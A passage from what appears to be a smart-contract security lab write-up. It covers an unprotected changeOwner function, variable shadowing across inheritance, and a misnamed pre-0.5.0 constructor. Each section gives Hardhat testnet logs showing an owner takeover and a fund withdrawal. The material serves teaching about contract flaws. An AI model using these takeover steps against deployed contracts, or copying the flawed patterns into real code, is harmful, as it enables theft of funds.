Not much to explain, just that the function `changeOwner` is not using the `onlyowner` modifier, so anyone can call that function

## Full exploit

Just call `changeOwner_fixed`, and observe that it errors out:
```
  Contract call:       <UnrecognizedContract>
  Transaction:         0xf2046170295124d84c4d107d7e05f82ce2476c3073b9e816e2e3a33e5dd3bed4
  From:                0x70997970c51812dc3a010c7d01b50e0d17dc79c8
  To:                  0xa513e6e4b8f2a923d98304ec87f64353c4d5c853
  Value:               0 ETH
  Gas used:            23942 of 30000000
  Block #9:            0x35c4d68df2d768d70c029b4cd44c673f533a1440e79b47677c692b1476f19fe3

  Error: VM Exception while processing transaction: reverted with reason string 'You're not the owner, m8'
      at <UnrecognizedContract>.<unknown> (0xa513e6e4b8f2a923d98304ec87f64353c4d5c853)
      at HardhatNode._mineBlockWithPendingTxs (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1773:23)
      at HardhatNode.mineBlock (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:466:16)
      at EthModule._sendTransactionAndReturnHash (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1504:18)
      at HardhatNetworkProvider._sendWithLogging (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:139:22)
      at HardhatNetworkProvider.request (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:116:18)
      at JsonRpcHandler._handleRequest (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/jsonrpc/handler.ts:188:20)
      at JsonRpcHandler._handleSingleRequest (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/jsonrpc/handler.ts:167:17)
```

Then, call the unprotected function, `changeOwner`, and it finishes without problem, changing the contract's owner:
```
 Contract call:       <UnrecognizedContract>
  Transaction:         0x16ed3c80e9a8f8abd635d8218b55a5a5a5bff070d1fe43c9409162051910526e
  From:                0x70997970c51812dc3a010c7d01b50e0d17dc79c8
  To:                  0xa513e6e4b8f2a923d98304ec87f64353c4d5c853
  Value:               0 ETH
  Gas used:            30511 of 30000000
  Block #10:           0x343a980b7c37bfe6995a4d8ff96a5ea5d53054fe7088104bc912a001cd2878dd

  console.log:
    [Unprotected] changed owner to:
    0x70997970c51812dc3a010c7d01b50e0d17dc79c8
```

<br/>
<br/>
<br/>

# Variable Shadowing

Changes to compile:
  - Set the owner address to `address payable` (lines :2 and :9)
  - Change the constructor name (line :10) from `function C()` to `constructor () public`

## Vulnerability explanation

Inheritance in Solidity is quite wonky: even though the methods are inherited, attributes used in the parent's method use the _parent's_ values.

## Full exploit

There's nothing to exploit in this example, really.
Just call `suicide()` and observe the error when trying to delete the contract:
```
  Contract call:       C#suicide
  Transaction:         0x1ad502a2210c997df932dd2b705fad85670887de2c96d53bfd6f7ec1d2fbaeb8
  From:                0x70997970c51812dc3a010c7d01b50e0d17dc79c8
  To:                  0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6
  Value:               0 ETH
  Gas used:            27364 of 30000000
  Block #10:           0xfb5bca23110b3d91bff9c62cf45bd1e588417048ad6e2060b4eb42b77fc8aa61

  console.log:
    [Suicidal] calling suicide()... The owner address is:
    0x0000000000000000000000000000000000000000

  Error: VM Exception while processing transaction: reverted with reason string 'Nah uh uh, you didn't say the magic word'
      at C.suicide (contracts/010-Variable shadowing.sol:10)
      at HardhatNode._mineBlockWithPendingTxs (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1773:23)
      at HardhatNode.mineBlock (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:466:16)
      at EthModule._sendTransactionAndReturnHash (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1504:18)
      at HardhatNetworkProvider._sendWithLogging (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:139:22)
      at HardhatNetworkProvider.request (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:116:18)
      at JsonRpcHandler._handleRequest (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/jsonrpc/handler.ts:188:20)
      at JsonRpcHandler._handleSingleRequest (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/jsonrpc/handler.ts:167:17)
```
This happens because, although the constructor on `C` does initialise the `C.owner` variable, this change is reflected only on `C`, but not on its parent.
When calling the function `suicide`, which executes within the parent's context (and, subsequently, with the unitialised value of `Suicide.owner`), the precondition fails.

<br/>
<br/>
<br/>

# Wrong Constructor Name

Changes to compile:
  - Change line :23 to lookup the current balance like this: `address (this).balance`, instead of simply `this.balance`
  - Change the data type of `owner` to be `address payable` (line :20)

## Vulnerability explanation

Not much to explain here either: before solidity 0.5.0, constructors had to be named like the the contract itself (in this example, it should be declared like `function Missing () {`).
In newer compiler versions that's that much of not an issue anymore, since it's clearly declared like `constructor () {`

## Full exploit

We can first try to withdraw the funds, but it will fail because we're not the owner:
```
  Contract call:       Missing#withdraw
  Transaction:         0x3b608c26a28a79547786c6f77ea81d5e4bb6ec2dec474cb802c82267f8671827
  From:                0x70997970c51812dc3a010c7d01b50e0d17dc79c8
  To:                  0x8a791620dd6260079bf849dc5567adc3f2fdc318
  Value:               0 ETH
  Gas used:            23391 of 30000000
  Block #11:           0xf61835e39197eb11397e599aa9077455aceb8c4ffaf0e99b0191368b1120618a

  Error: Transaction reverted without a reason string
      at Missing.onlyowner (contracts/011-Incorrect constructor.sol:8)
      at HardhatNode._mineBlockWithPendingTxs (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1773:23)
      at HardhatNode.mineBlock (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:466:16)
      at EthModule._sendTransactionAndReturnHash (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1504:18)
      at HardhatNetworkProvider._sendWithLogging (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:139:22)
      at HardhatNetworkProvider.request (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:116:18)
      at JsonRpcHandler._handleRequest (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/jsonrpc/handler.ts:188:20)
      at JsonRpcHandler._handleSingleRequest (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/jsonrpc/handler.ts:167:17)
```

To fix that, we can simply call `IamMissing` to become the owners and try to withdraw again:
```
  Contract call:       Missing#IamMissing
  Transaction:         0x5d699ac4ebf9e3a71db2369db24a68f6ed1d02d97740b6565a42a6b41b94f1c3
  From:                0x70997970c51812dc3a010c7d01b50e0d17dc79c8
  To:                  0x8a791620dd6260079bf849dc5567adc3f2fdc318
  Value:               0 ETH
  Gas used:            47130 of 30000000
  Block #12:           0xc7819d4a5ed01c09a2ec5dfdafffcf17e913b0b999bd2f79cb569087c9aaf0a2

  console.log:
    [Missing] New owner set to:
    0x70997970c51812dc3a010c7d01b50e0d17dc79c8

eth_getTransactionReceipt
eth_getBlockByNumber (7)
eth_gasPrice
eth_sendTransaction
  Contract call:       Missing#withdraw
  Transaction:         0x7dc051006cfa97479e26bf9f8ca4f061c7fcd924cb602bf98bab3dcb2f4c556f
  From:                0x70997970c51812dc3a010c7d01b50e0d17dc79c8
  To:                  0x8a791620dd6260079bf849dc5567adc3f2fdc318
  Value:               0 ETH
  Gas used:            23840 of 30000000
  Block #13:           0x0caa73ffae3e31cadb74858a9f08ea99586a3f6209351da979bcd083dd0fc0a5

eth_getTransactionReceipt
eth_getBlockByNumber
eth_getTransactionReceipt
eth_getBalance (3)
eth_getBlockByNumber (6)
```
